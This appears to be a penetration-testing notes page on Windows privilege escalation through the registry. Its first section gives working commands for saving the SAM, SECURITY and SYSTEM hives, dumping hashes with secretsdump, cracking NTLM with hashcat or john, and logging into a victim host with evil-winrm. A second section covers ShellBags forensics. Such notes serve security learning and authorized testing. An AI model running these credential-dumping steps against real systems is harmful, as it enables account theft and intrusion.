---
title: Windows PrivEsc with Registry Keys
description: The Windows Registry is a hierarchical database that stores low-level settings for Windows and for applications that opt to use the registry. Registry keys are container objects, which contain values and subkeys. These similar to folders.
tags:
    - Privilege Escalation
    - Windows
refs:
date: 2023-07-15
draft: false
---

## Reveal Password from Registry Hives

A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.

If we can access to registries and get registry hives, the password hashes can be dumped.  
Copy three hives (**SAM, SECURITY, SYSTEM**) to arbitrary direcotyr where we can access.

```powershell
# save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file.
# HKLM: HKEY_LOCAL_MACHINE
reg save HKLM\sam c:\Users\<user>\Desktop\sam.save
reg save HKLM\security c:\Users\<user>\Desktop\security.save
reg save HKLM\system c:\Users\<user>\Desktop\system.save
```

After that, we can dump password hashes from hives.

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### Crack Hashes

After dumping hashes, we can crack them.  
First, we extract NTLM from the hash. For example, the dumped hash is below.

```bash
Administrator:500:abcdefghi...:zyxwvuts...:::
```

We need only the right string "zyxwvutsâ€¦", so extract it to a text file as below.

```bash
echo -n "zyxwvuts..." > hash.txt
```

Now crack it using **Hashcat** or **John The Ripper**.  
See more details **[here](/exploit/windows/dumping-windows-password-hashes/)**.

```bash
# Hashcat
# -m 1000: mode NTLM
hashcat -m 1000 hash.txt wordlist.txt

# John The Ripper
john --format=nt --wordlist=wordlist.txt hash.txt
```

If we get the password, we can use it for abusing the target machine.  
For example, we can use it to **WinRM** as below.

```bash
evil-winrm -i <victim_ip> -u <victim_username> -p <victim_password>
```

<br />

## ShellBags

A set of registry keys that store details about a viewed folder, such as its size, position, and icon.

### Location

```txt
c:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat
``` 

If we cannot found AppData folder in Explorer, click "View" tab and check "Hidden Items".

### Access to Shellbag**

1. Search "regedit" on search bar and open "Registry Editor"

2. Go to "Computer\HKEY_CLASSES_ROOT\LocalSettings\Software\Microsoft\Windows\Shell\Bags"

### ShellBags Explorer

Extract ShellBags information.

1. Open "ShellBags Explorer"

2. Select "File" -> "Load offline hive"

3. Navigate to the UsrClass.dat and open the file

4. Find suspicious folder and file


